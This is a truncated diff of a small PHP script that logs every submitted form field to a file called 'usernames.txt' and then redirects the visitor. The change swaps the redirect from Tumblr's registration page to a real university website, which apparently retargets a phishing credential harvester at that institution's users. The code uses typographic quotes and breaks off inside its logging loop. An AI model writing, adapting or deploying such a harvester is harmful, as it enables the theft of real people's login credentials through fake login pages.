@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.tumblr.com/register’);
+header (‘Location:https://leons.cspc.edu.ph/’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
